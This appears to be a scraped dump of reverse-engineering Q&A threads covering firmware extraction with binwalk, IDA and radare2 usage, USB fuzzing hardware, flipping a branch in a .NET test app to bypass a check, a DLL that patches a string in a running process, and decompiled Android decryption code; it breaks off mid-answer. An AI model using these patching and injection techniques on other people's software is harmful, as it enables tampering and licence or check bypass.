377638      0x5C326     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4146 bytes
378953      0x5C849     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 1487 bytes
379723      0x5CB4B     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2240 bytes
380729      0x5CF39     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 1527 bytes
381510      0x5D246     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 8294 bytes
384148      0x5DC94     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 10412 bytes
385299      0x5E113     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 16812 bytes
389806      0x5F2AE     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 9294 bytes
391417      0x5F8F9     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 9108 bytes
392764      0x5FE3C     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4796 bytes
393633      0x601A1     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 3710 bytes
394440      0x604C8     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 7870 bytes
395948      0x60AAC     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 10764 bytes
398896      0x61630     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 6804 bytes
400960      0x61E40     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2135 bytes
401785      0x62179     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2864 bytes
402878      0x625BE     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 3747 bytes
404192      0x62AE0     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2776 bytes
405196      0x62ECC     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 6761 bytes
407148      0x6366C     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 1582 bytes
407859      0x63933     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 6849 bytes
409864      0x64108     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4678 bytes
411440      0x64730     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 11297 bytes
414011      0x6513B     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 3990 bytes
415534      0x6572E     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 12540 bytes
418894      0x6644E     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 3623 bytes
420239      0x6698F     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 13366 bytes
423782      0x67766     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 5498 bytes
425717      0x67EF5     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 1524 bytes
426450      0x681D2     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 28728 bytes
434580      0x6A194     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 18125 bytes
439538      0x6B4F2     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 36719 bytes
445116      0x6CABC     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 1940 bytes
</code></pre>

<p>Checking the hexdump code I found that binwalk detects the lzma magic number '5d 00' but I think that this is inconsistent and a false positive:</p>

<pre><code>root@kali:~/Desktop/Firmwares/DLink# cat hexdump.txt | grep '5d 00'
00000030  5d 00 00 00 02 f0 23 0f  00 00 00 00 00 00 20 20  |].....#.......  |
0000c7b0  f9 5d 00 0e e6 e7 55 ca  16 5f d1 c9 67 67 30 c7  |.]....U.._..gg0.|
00049900  ac 00 5d 00 00 00 02 c9  1d 00 00 00 00 00 00 00  |..].............|
0004a2c0  6e 93 3d d1 e8 e3 96 5a  f9 17 38 b1 28 5d 00 00  |n.=....Z..8.(]..|
0004bb30  25 14 f9 96 26 85 58 20  18 07 b9 fa e3 5d 00 00  |%...&amp;.X .....]..|
0004c360  9f f6 e9 d8 28 5d 00 00  00 02 19 19 00 00 00 00  |....(]..........|
0004cbe0  f6 20 5d 00 00 00 02 36  18 00 00 00 00 00 00 00  |. ]....6........|
0004d470  3f 38 df 6f 97 98 4b 41  0d 83 14 d8 4d 00 5d 00  |?8.o..KA....M.].|
0004e000  78 c4 bc c4 11 98 56 00  5d 00 00 00 02 c3 26 00  |x.....V.].....&amp;.|
0004eb30  e6 73 64 e2 bc fa 37 7a  11 0d 3c b1 d2 af 5d 00  |.sd...7z..&lt;...].|
0004f080  57 ad 80 5f 20 ef 40 0e  7c 5d 00 00 00 02 f5 04  |W.._ .@.|]......|
0004f280  1a 1c ab 00 5d 00 00 00  02 39 26 00 00 00 00 00  |....]....9&amp;.....|
0004fd70  5d 00 00 00 02 f5 25 00  00 00 00 00 00 00 1e 12  |].....%.........|
</code></pre>

<p>After this I browsed the hexdump and found some strings in 00000000 and 00042fa0:</p>

<pre><code>00000000  41 49 48 30 4c 0f c1 fb  80 00 01 00 00 04 2f 74  |AIH0L........./t|
00042fa0  6e 23 00 00 41 49 48 30  4c 0f c1 fb 00 00 00 00  |n#..AIH0L.......|
</code></pre>

<p>Googling for AIH0L I did not find anything useful and now I'm stuck.</p>

<p>Other things I tried was to search bin img sqsh sq sh and other strings in the hexdump without result.</p>

<p>Also the entropy analysis seems weird for me. 
<img src=""https://i.stack.imgur.com/rSKlo.png"" alt=""Entropy output binwalk""></p>

<p>Did anyone faced this issues or can figure out how to extract this?
Regards.</p>

<p><strong>EDIT:</strong>
Searching for filesystems 'fs' in the hexdump file I found a zfs header:</p>

<p>t@kali:~/Desktop/Firmwares/DLink# cat hexdump.txt | grep zfs</p>

<pre><code>0000b990  65 a7 0c aa 7a 66 73 24  1e bc b6 e8 d7 c4 29 1a  |e...zfs$......).|
</code></pre>

<p>I'm not sure wether this points to a real zfs or it's just a coincidence. I copied the firmware from that position to the end but the new file is not recognized and the binwalk lecture is the same as above.</p>
","<p>The LZMA compression identified by binwalk is correct (or at least most of them are - I didn't check them all). If you actually extract and decompress the LZMA files, you'll find that the first one (at offset 0x30) contains the device's code (a MIPS RTOS of some sort) and the rest appear to be the HTML files for the web interface.</p>
","2831"
"Mapping an external module's source code to assembly - extracting information from source code","925","","<p>The situation is the following:</p>

<p>I'm reversing an application, In which I found a lot of functions that belongs to the OpenSSL library. Since I have the source code for this module, I was wondering if it's possible to somehow ""extract"" the variable names, structures, function names from the source code, and sync/map it to IDA?</p>
","<ol>
<li>Build the module with debug symbols</li>
<li>Load the module you built into IDA Pro and import the debug symbols</li>
<li>Use <a href=""http://www.zynamics.com/bindiff.html"">BinDiff</a> to port function names, etc. from the IDB of the module you built to the IDB of your target module</li>
</ol>
","3222"
"How extract this firmware file?","924","","<p>I need extract this firmware file. I tried <code>firmwaremodkit</code> and <code>binwalk</code>. It founds two trx headers, but cannot open it.( delete start in hexedit and untrx throws segfault, fmk found nothing)... </p>

<p>Interesting is the constant repetition of the sequence: 00 00 11 53 48 44 52</p>

<p>Some tips how extract it?</p>

<p><a href=""http://uloz.to/xY4X3cPh/download-dwn"" rel=""nofollow"">http://uloz.to/xY4X3cPh/download-dwn</a></p>
","<p>It is an encrypted firmware of the GBR2851T Freeview HD Digital Receiver, so you cannot extract it without the proper encryption key.<br>
If you are interested in i-CAN (ADB) internals, see the following vulnerability report <a href=""http://www.security-explorations.com/materials/se-2011-01-adb.pdf"" rel=""nofollow"">http://www.security-explorations.com/materials/se-2011-01-adb.pdf</a>.</p>
","8744"
"How do you store your data about a binary while performing analysis?","922","","<p>Since now, when I am analyzing a binary, I'm using a ""pen and paper"" method to locate the different location of the function, the different type of obfuscations, and all my discoveries. It is quite inefficient and do not scale at all when I try to analyze big binaries.</p>

<p>I know that IDAPro is having a data-base to store comments and a memory zone, but, in case we do not want to use IDAPro, what techniques or (free) tools are you using to collect your notes and to display it properly ?</p>
","<p><a href=""http://radare.org"" rel=""nofollow noreferrer"">radare2</a> does support projects. They are not as sophisticated as IDAs .idb format, but they do the trick if saving patches and comments is all that you want.
(Just make sure to build it from <a href=""http://github.com/radare/radare2"" rel=""nofollow noreferrer"">git</a>)</p>

<p>Taken from the Radare2 Github README:</p>

<blockquote>
  <h1>Webserver</h1>
  
  <p>radare2 comes with an embedded webserver that serves a pure html/js interface
  that sends ajax queries to the core and aims to implement an usable UI for
  phones, tablets and desktops.</p>

<pre><code>$ r2 -c=H /bin/ls
</code></pre>
</blockquote>

<p><img src=""https://i.stack.imgur.com/yutKT.jpg"" alt=""Radare2 Webserver vizualized on a mobile phone""></p>
","1940"
"Setting an USB Emulation and Fuzzing Platform?","918","","<p>I would like to analyze (and fuzz) a USB device and I need a bit of guidance to setup a full platform to discuss with the device.</p>

<p>First, I would like to know what are the most used hardware cards to emulate and perform fuzzing on USB devices. I've heard about the <a href=""http://goodfet.sourceforge.net/hardware/facedancer11/"">FaceDancer11 card</a> with a Python API (see a few  blog posts [<a href=""http://travisgoodspeed.blogspot.fr/2012/07/emulating-usb-devices-with-python.html"">1</a>,<a href=""http://travisgoodspeed.blogspot.fr/2012/10/emulating-usb-dfu-to-capture-firmware.html"">2</a>] from <a href=""http://travisgoodspeed.blogspot.fr/"">Travis Goodspeed</a>). But, are they others ?</p>

<p>Also, if someone could come with a list of the needed hardware devices and, maybe, some existing Python libraries that are useful to have and, what development effort is needed to setup such a platform, it would be helpful.</p>
","<p>Apart from the <code>FaceDancer</code> from Goodspeed, I have never been able to find anything similar. I personally use the <code>FaceDancer[11 &amp; 21]</code> and now I built my own emulator (not that easy if your electronics skills are rusty). But depending on the kind of analysis you want to perform you could find different other types of hardware, or software for that matter. </p>

<p>For sniffing I suppose <a href=""http://openvizsla.org/"" rel=""nofollow""><code>OpenVizsla</code></a> is a great tool (Free &amp; Open). Thought it is not available for sale yet, you can implement it yourself on an <code>FPGA</code> &amp; try it. You also have the <a href=""http://www.adafruit.com/products/708"" rel=""nofollow"">Beagle</a> from Total Phase which is quite expensive thought.</p>
","4541"
"How can I use an x64 debugger to reroute a .NET application's logic?","917","","<p>I'd like to improve my reverse engineering skills, so I made this WPF application (targeting x64, of course):</p>

<p><strong>MainWindow.xaml</strong>:</p>

<pre><code>&lt;Window x:Class=""ApplicationTest.MainWindow""
        xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
        xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
        Title=""Harness""
        WindowStyle=""ToolWindow""
        Width=""200""
        Height=""200""&gt;
    &lt;Grid&gt;
        &lt;Button Content=""Go"" Click=""Button_Click""/&gt;
    &lt;/Grid&gt;
&lt;/Window&gt;
</code></pre>

<p><strong>MainWindow.xaml.cs</strong>:</p>

<pre><code>namespace ApplicationTest
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            var value = ""No"";
            if (value.Equals(""No"", StringComparison.OrdinalIgnoreCase))
                MessageBox.Show(""You cannot proceed."");
            else
                MessageBox.Show(""Well done, lad."");
        }
    }
}
</code></pre>

<p>When I debug it with <a href=""http://x64dbg.com/#start"" rel=""nofollow"">x64dbg</a>, I'm trying to find the location of the <code>value.Equals(""No"", StringComparison.OrdinalIgnoreCase)</code> comparison, but I am having trouble finding a way to trace the application to its button click event. Ideally, I want to use x64dbg to modify my application's executable and have it run the <code>else</code> statement and print <code>""Well done, lad.""</code> instead. How can this be achieved?</p>

<p>In my Symbols window, under the <code>applicationtest.exe</code> symbol, I see <code>Button_Click</code> at a particular address, but when I try to set breakpoints in or around here in the <code>Disassembler</code> view it never hits them when I click the actual button.</p>
","<p><strong>Modifying a Release-Mode .NET Assembly</strong></p>

<p>Since IL is so simple, one way to achieve the same result without a debugger is to simply decompile the executable using ILDASM on a corresponding <strong>.NET release mode x64 executable</strong> using the following command line command:</p>

<pre><code>""C:\Program Files (x86)\Microsoft SDKs\Windows\v8.1A\bin\NETFX 4.5.1 Tools\ildasm.exe"" ApplicationTest.exe /out:Disassembly.asm
</code></pre>

<p>In the disassembly, you will see the following IL instructions under the <code>Button_Click</code> method:</p>

<pre><code>IL_000d:  callvirt   instance bool [mscorlib]System.String::Equals(string,
                                                                       valuetype [mscorlib]System.StringComparison)
    IL_0012:  brfalse.s  IL_0020

    IL_0014:  ldstr      ""You cannot proceed.""
</code></pre>

<p>It's very verbose and looks almost identical to your original .NET code so it makes it really easy to find the location of your corresponding code. Modify the text <code>brfalse</code> to be <code>brtrue</code>, and compile it using ILASM:</p>

<pre><code>""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe"" Disassembly.asm
</code></pre>

<p>The result will be an assembly named <code>Disassembly.exe</code> which is nearly identical to the original assembly except that it has rerouted application logic. Now when you execute it, clicking the button will print <code>Well done, lad.</code>.</p>

<p><strong>Note</strong>: You may need to download the Windows SDK or corresponding .NET Framework your .NET project is running in order to get access to ILDASM or ILASM. Also, these tools may not work if your .NET application uses a different version of the .NET framework than the .NET versions that the version of ILDASM or ILASM you are using target.</p>

<p><strong>Debugging a Release-Mode .NET Assembly's MSIL Assembly Code Line-by-Line</strong></p>

<p>To directly answer the question, you can debug release-mode .NET assemblies line by line. You first need to decompile any .NET assembly into IL code as I have shown above, using ildasm. Then, you can recompile your assembly in ilasm using the <code>/pdb</code> flag (<code>ilasm Disassembly.asm /pdb</code>) to create a debug database that will let you debug any .NET assembly line by line. Here is a simple demonstration of how to do that. Once you have compiled using <code>ilasm Disassembly.asm /pdb</code>, launch the executable (<code>Disassembly.exe</code>). In Visual Studio, go to <code>Tools -&gt; Attach to process</code> and attach the debugger to <code>Disassembly.exe</code>. Once attached, go to <code>Debug -&gt; Options and Settings -&gt; Debugger -&gt; Symbols</code> and make sure you add the location of the folder hosting the <code>Disassembly.pdb</code> file (it should be the same folder that <code>Disassembly.exe</code> is in if you followed this guide correctly thus far. Hit the pause button in Visual Studio to freeze execution and go to <code>Debug -&gt; Windows -&gt; Threads</code> and view your threads. Navigate through the threads by double clicking on them. You may need to disable <code>Just my code</code>. If it prompts you, go ahead and do it, it should be a single click in the thread view. Eventually, you will see that one of your threads shows you the IL <code>Disassembly.asm</code>. You can add breakpoints in and debug it line by line. Here is a screenshot:</p>

<p><img src=""https://i.stack.imgur.com/DKTor.png"" alt=""enter image description here""></p>

<p>Just a quick note, you may need to resume then freeze again after loading symbols so that Visual Studio synchronizes them. Also, for this to work, you will need the corresponding <code>Disassembly.asm</code> file in the same directory as well.</p>

<p>Also, Visual Studio has a handy Disassembly View (<code>Debug -&gt; Windows -&gt; Disassembly</code>) which shows you the machine instructions generated by JIT instead of IL instructions, but this window you cannot debug, presumably because JIT generates this stuff dynamically.</p>
","9291"
"Identify Jump Statements due to Switch/Case in IDA Pro","916","","<p>I want to identify the jump statements due to switch/case in an IDA Pro disassembled binary. My ultimate goal is to read the jump table entries. I am also interested in function table/vtables. For switch/case, I see the jump statements as:</p>

<ol>
<li><p><code>jmp  ds:off_20B280CC[ebx*4]</code></p></li>
<li><p><code>jmp  dword ptr ds:loc_6B2A825C[ecx*4]</code> [Q: Is it due to switch/jump?]</p></li>
</ol>

<p>The operand types of these jumps, as I see from <code>GetOperandValue(inst.ea, 0)</code>, are ""Memory Reference"" (type value 2). The jump statements like <code>jb short loc_6B2A8154</code> has operand type ""Immediate Near Address"" (type value 7). However, the jump statements like <code>jmp ds:__imp_memset</code> in the thunk functions to call imported functions also have the operand type ""Memory Reference"". </p>

<p>Is there any way I can distinguish between jump statements for switch/case and thunk functions? </p>
","<p>In many cases, IDA already knows that a jump is part of a jump-table and probably the result of a switch. When this is true, you can access it using IDAPython.</p>

<p>The relevant functions are <code>get_switch_info_ex(ea)</code> and <code>get_switch_info_ex(ea)</code>.
Looking in <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/ida_xref-module.html#calc_switch_cases"" rel=""nofollow"">IDAPython's documentation</a>, we find:</p>

<blockquote>
  <p>calc_switch_cases(insn_ea, py_swi)</p>
  
  <p>Get information about a switch's cases.</p>
  
  <p>The returned information can be used as follows:</p>

<pre><code>for idx in xrange(len(results.cases)):
    cur_case = results.cases[idx]
    for cidx in xrange(len(cur_case)):
        print ""case: %d"" % cur_case[cidx]
    print ""  goto 0x%x"" % results.targets[idx]
</code></pre>
  
  <p>@param insn_ea: address of the 'indirect jump' instruction @param si:
  switch information</p>
  
  <p>@return: a structure with 2 members: 'cases', and 'targets'.</p>
  
  <p>Returns: cases_and_targets_t</p>
</blockquote>

<p>To get the <code>results</code> variable from the example, we use the following code:</p>

<pre><code>si = idaapi.get_switch_info_ex(ea)
results = idaapi.calc_switch_cases(ea, si)
if not results:
    print ""No switch related jump at 0x{:X}"".format(ea)
</code></pre>

<p>So to check if an instruction is a switch or not, you can use the following function:</p>

<pre><code>def is_switch(ea):
    si = idaapi.get_switch_info_ex(ea)
    results = idaapi.calc_switch_cases(ea, si)
    return bool(results)
</code></pre>

<p>If you wish to use it, I've written a basic wrapper class for IDA's switch in Sark. <a href=""https://github.com/tmr232/Sark/blob/master/sark/code/switch.py"" rel=""nofollow"">See here</a>.</p>
","13618"
"Demangle c++ functions in radare2","915","","<p>I am learning radare2. Is there a way to demangle c++ functions during disassembling? For example in gdb</p>

<pre><code>set print asm-demangle
</code></pre>

<p>changes </p>

<pre><code>callq 0x400a30 &lt;_ZNSo3putEc@plt&gt;
</code></pre>

<p>to</p>

<pre><code>callq 0x400a30 &lt;_std::ostream::put(char)@plt&gt;
</code></pre>

<p>edit:
I had radare2 0.9.6 which comes with Ubuntu's synaptic package manager. I reinstalled it from <a href=""https://github.com/radare/radare2"" rel=""nofollow"">https://github.com/radare/radare2</a>. Now I see the <code>asm.demangle</code> variable after entering <code>Ve</code>, it is set to true, but names are still mangled.</p>
","<p>Check <code>e asm.demangle</code>, and set it to true or false as required.</p>

<p>Is the radare2 version you are using the latest one?</p>

<p>You should be able to view all the configuration data with <code>e</code>.</p>

<p>Typing <code>e??</code> should show you a complete list of configuration variables with their description. You can grep through the output for all the vars that have the pattern <em>demangle</em> with</p>

<pre>
[0x00001d52]> e??~demangle
        asm.demangle: Show demangled symbols in disasm
        bin.demangle: Import demangled symbols from RBin
            bin.lang: Language for bin.demangle
[0x00001d52]>
</pre>

<p>Radare2 needs to be told to load the demangle informations at startup, so you can set <code>bin.demangle</code> to <code>true</code>, and reopen the file:</p>

<pre><code> e bin.demangle = true
 oo 
</code></pre>

<p>Last but not least, you can provide a symbol name in its mangled form on a case by case basis, using the command <code>iD</code>:</p>

<pre><code>[0x7c810705]&gt; iD cxx _ZNSo3putEc
std::ostream::put
[0x7c810705]&gt;
</code></pre>

<p>By the way, a tip instead of asking a question here and waiting forever:
radare2 is self documented, so you can begin by typing <code>?</code> to get help, and then append <code>?</code> to each command, like <code>a?</code>, or <code>pd?</code> and so on…</p>
","11595"
"Patching a string using DLL injection and OllyDbg","915","","<p>I'm a novice when it comes to RE but I'm trying to get into it. I have a background in C/C++ so doing the development side of things should be a breeze (aside from when assembly has to be used, im rusty there). I just need to be pointed in the right direction with RE things and will be able to pick things up from there. </p>

<p>I wrote a simple CLI program (HackMe.exe) to practice RE with, using OllyDbg. It just has a string(""change me"") which I'm attempting to change (patch?) via a DLL.</p>

<p>Here's the CLI prog source</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;Windows.h&gt;

int main(int argc, char** argv) {
    char* change_me = ""change me"";

    while(true) {
        std::cout &lt;&lt; change_me &lt;&lt; std::endl;
        Sleep(3000);
    }

    return 0;
}
</code></pre>

<p>and the DLL source so far which is bare bone</p>

<pre><code>#include &lt;Windows.h&gt;
#include &lt;fstream&gt;
#include &lt;iostream&gt;

VOID attach();

BOOL APIENTRY DllMain(HMODULE module, DWORD reason, LPVOID reserved) {

    switch(reason) {
        case DLL_PROCESS_ATTACH: {
            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&amp;attach, 0, 0, 0);
            break;
        }
    }

    return TRUE;
}

VOID attach() {
    // patching code will go here
}
</code></pre>

<p>So far what I've done is</p>

<ul>
<li>Attached OllyDbg to running HackMe.exe process</li>
<li>Searched for all referenced text strings and followed the ""change me"" string</li>
</ul>

<p>Following the the string brought me to where the string was found</p>

<p><a href=""https://i.stack.imgur.com/jf5Kw.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/jf5Kw.png"" alt=""enter image description here""></a></p>

<p>So correct me if I'm wrong or not including something but I believe I need to</p>

<ul>
<li>Find the base address of the process and the offset to the string address</li>
<li>Patch the memory at base + offset with a new string thats len is == to the original </li>
</ul>

<p><strong>So i guess my questions are</strong></p>

<ol>
<li>How do I find the base offset of process (I assume I can do in the DLL using something like GetModuleHandle(""HackMe.exe""))? </li>
<li>Is there a way to see the base offset in OllyDbg (not that useful I suppose since the base will more than likely change every time the exe is ran)?</li>
<li>How do I find the +offset of the string from the base?</li>
</ol>

<p><strong>Working end result</strong></p>

<pre><code>#include &lt;Windows.h&gt;

VOID attach();

BOOL APIENTRY DllMain(HMODULE module, DWORD reason, LPVOID reserved) {

    switch(reason) {
        case DLL_PROCESS_ATTACH: {
            attach();
            break;
        }
    }

    return TRUE;
}

VOID attach() {

    DWORD old;
    DWORD base   = (DWORD)GetModuleHandle(NULL);
    DWORD offset = 0x01CC80;

    char* ptr = reinterpret_cast&lt;char*&gt;(base + offset);
    const size_t length   = 10;
    char buffer[ length ] = ""changed:)"";

    VirtualProtect(ptr, length, PAGE_EXECUTE_READWRITE, &amp;old);
    memcpy(ptr, buffer, length);
    VirtualProtect(ptr, length, old, nullptr);
}
</code></pre>
","<blockquote>
  <ol>
  <li>How do I find the base offset of process (I assume I can do in the DLL using something like GetModuleHandle(""HackMe.exe""))?</li>
  </ol>
</blockquote>

<p>A process doesn't have a base offset; I believe you mean the base address of the primary module. To get that address, you would use <code>GetModuleHandle(NULL)</code>.</p>

<blockquote>
  <ol start=""2"">
  <li>Is there a way to see the base offset in OllyDbg (not that useful I suppose since the base will more than likely change every time the exe
  is ran)?</li>
  </ol>
</blockquote>

<p><kbd>Alt</kbd>+<kbd>E</kbd> will show you the base address of each loaded module.</p>

<blockquote>
  <ol start=""3"">
  <li>How do I find the +offset of the string from the base?</li>
  </ol>
</blockquote>

<p>There are countless ways to do it, but an easy way is to use a tool like IDA or <a href=""http://www.mcafee.com/us/downloads/free-tools/bintext.aspx"" rel=""nofollow"">BinText</a> to find the string's virtual address, and then subtract from that the default base address of HackMe.exe.</p>
","12276"
"Help me reverse this","913","","<p>It's been 4 nights I'm struggling decompiling this one. It's an Android native library that I ran through IDA to get C code.</p>

<p>Java signature :</p>

<pre><code>byte[] resultArray = new byte[-2 + dataArray.length];
dataLength= dataArray.length;
decryptData(byte[] resultArray, byte[] dataArray, int dataLength, int enumValue /* in our case should be 01 */, long paramLong /* dunno */)
</code></pre>

<p>The disassembly in C :</p>

<pre><code>//----- (00001354) --------------------------------------------------------
int __fastcall doXor(int result, int a2, int a3, int a4, int a5, int a6, char a7)
{
  int v7; // r5@1
  int v8; // r6@1
  int v9; // r7@1
  int v10; // r1@1
  char v11; // lr@3
  char v12; // t1@3
  char v13; // t1@3

  v7 = a2 - 1;
  v8 = a3 - 1;
  v9 = result - 1;
  v10 = a2 + a5 - 1;
  while ( v7 != v10 )
  {
    v12 = *(_BYTE *)(v7++ + 1);
    v11 = v12;
    v13 = *(_BYTE *)(v8++ + 1);
    *(_BYTE *)(v9++ + 1) = v11 ^ v13;
  } // ====== so far this one just does a xor in the full array
  //   ===&gt;what does this one do?
  *(_BYTE *)(result + a5) = *(_BYTE *)(a3 + a5) ^ a7;

  return result;
}

//----- (00001384) --------------------------------------------------------
int getNumber()
{
  __int32 v0; // r0@1

  v0 = time(0);
  srand48(v0);
  return (unsigned __int8)lrand48();
}

//----- (00001398) --------------------------------------------------------
int __fastcall getKey(void *a1, unsigned int a2, unsigned __int8 a3, int a4, char a5)
{
  void *v5; // r8@1
  unsigned int v6; // r7@1
  unsigned int v7; // r10@1
  void *v8; // r5@1
  __int64 v9; // r0@1
  signed int v10; // r6@1
  __int64 v12; // [sp+8h] [bp-30h]@1
  int v13; // [sp+14h] [bp-24h]@1

  v5 = a1;
  v6 = a2;
  v7 = a2 &gt;&gt; 3;
  v8 = a1;
  v13 = _stack_chk_guard; //a stack guard
  LODWORD(v9) = crc64(a3, (int)&amp;a5, _stack_chk_guard, 8);
  v10 = 0;
  v12 = v9;
  do
  {
    ++v10;
    if ( 8 * v10 &gt; v6 )
    {
      if ( v6 &gt;= 8 * v10 - 8 )
        LODWORD(v9) = memcpy(v8, &amp;v12, (size_t)((char *)v5 + v6 - (_DWORD)v8));
    }
    else
    {
      v9 = v12;
      *(_QWORD *)v8 = v12;
    }
    v8 = (char *)v8 + 8;
  }while ( v10 &lt;= (signed int)v7 );
  if ( v13 != _stack_chk_guard )
    _stack_chk_fail(v9);
  return v9;
}


//----- (000014E4) --------------------------------------------------------
signed int __fastcall decryptData(void *a1, unsigned int *a2, int a3, int a4, __int64 a5)
{
  int v5; // r4@1
  void *v6; // r11@1
  unsigned int *v7; // r10@1
  unsigned int v8; // r7@3
  int v9; // r9@3
  int v10; // ST10_4@3
  void *v11; // r8@3
  const void *v12; // r5@3
  int v13; // r6@3
  signed int result; // r0@5

  v5 = a3;
  v6 = a1;
  v7 = a2;
  if ( check == 1 )
  {
    if ( a5 )
    {
      result = 0;
    }
    else
    {
      v8 = *(_BYTE *)a2;
      v9 = a4 + v8;
      v10 = *((_BYTE *)a2 + a3 - 1);
      v11 = malloc(a3 - 1);
      v12 = malloc(v5 - 1);
      getKey(v11, (unsigned __int16)(v5 - 1), v9, (2596069104u * (unsigned __int64)v8 &gt;&gt; 32) + 305419896 * v8, -16 * v8);
      v13 = v5 - 2;
      doXor((int)v12, (int)((char *)v7 + 1), (int)v11, v10, v13, (unsigned __int64)v13 &gt;&gt; 32, v10);
      memcpy(v6, v12, v5 - 2);
      if ( *((char *)v12 + v5 - 2) != v9 )
        v13 = 0;
      if ( v11 )
        free(v11);
      free((void *)v12);
      result = v13;
    }
  }
  else
  {
    result = -1;
  }
  return result;
}
</code></pre>

<p>I have the implementation of crc64.
What I fail to understand is where does it get the seed from the data array for the getKey.</p>

<p>I'm not sure, I think it stores in the last 2 bytes the key that is used to generated the bigger key for xor. Please help, I'm really struggling and my C skills are a rusty.</p>

<p>Here is a set of data :</p>

<pre><code>$type = ""01"";
$length = ""37"";
$data=""ea8bf72287a0af8aa65edf259a43"".
""e1d8a67f71bce448273199848e401b33"".
""da379966a12ce4442e31991b71bde449"".
""39bb907d71bce448cc"";
</code></pre>

<p>Normally, first 8 bytes gives the latitude and second longitude which in this case is :
<code>f8869e63e888bb3f29ae997e0bc6e93f</code></p>

<p>So basically I assume we can expect this to be the coded version :
<code>ea8bf72287a0af8aa65edf259a43e1d8</code>
The inverse of xor is a xor so after xor it gives :
<code>120d69416f2814b58ff0465b918508e7</code></p>

<p>Which <em>hypothetically</em> is our partial xor key.</p>

<p>Now questions :</p>

<ul>
<li>what is the length of the seed stored in data?</li>
<li>how the xor key is computed?</li>
<li>are we sure about latitude/longitude position in data?</li>
</ul>

<p>If you want to help outside stack and discuss this please contact me.
Many thanks</p>
","

<p>Here's your code with names given to most variables. That's quite a bit of code so I'll try to only iterate the important parts. I also added a few comments in the code to help reading, although I didn't try to cover all code with comments. Make sure you go over the named parameters, I believe those will help you understand the code quickly. Viewing the code in a syntax highlighting editor will also help (couldn't get SO to highlight).</p>

<p>Please add a comment about anything that's not clear enough.</p>

<p>the <code>NI</code> prefix is my initials, you can ignore it. </p>

<p>First, <code>doXor</code>:</p>

<p>This function simply XORs all bytes except the last byte, which is treated a bit differently, but more on that later. This is not part of the <code>while</code> loop simply because it's recevied differently in <code>doXor</code>. A possible reasoning behind this is to force any user of <code>doXor</code> to explicitly deal with this value, as it's somewhat important for asserting the validity of the decrpyed message.</p>

<pre><code>//----- (00001354) --------------------------------------------------------
int __fastcall doXor(int result, int a2_NI_source, int a3_NI_key, int a4_NI_unused_copy_source_last_byte, int a5_NI_length, int a6_NI_unused, char a7_NI_source_last_byte)
{
  int v7; // r5@1
  int v8; // r6@1
  int v9; // r7@1
  int v10; // r1@1
  char v11; // lr@3
  char v12; // t1@3
  char v13; // t1@3

  v7_NI_source_pos = a2_NI_source - 1;
  v8_NI_key_pos = a3_NI_key - 1;
  v9_NI_result_pos = result - 1;
  v10_NI_source_end_loc = a2_NI_source + a5_NI_length - 1;
  while ( v7_NI_source_pos != v10_NI_source_end_loc )
  {
    // Ready bytes from v7_NI_source_pos and v8_NI_key_pos
    v12 = *(_BYTE *)(v7_NI_source_pos++ + 1); // READ BYTE OF a2 + offset
    v11 = v12;
    v13 = *(_BYTE *)(v8_NI_key_pos++ + 1); // READ BYTE OF a2 + offset

    // Xor two values and place in v9_NI_result_pos
    *(_BYTE *)(v9_NI_result_pos++ + 1) = v11 ^ v13;
  } // ====== so far this one just does a xor in the full array
  //   ===&gt;what does this one do?

  // XOR LAST BYTE OF key with a7_NI_source_last_byte (see decryptData for code that retreives the byte)
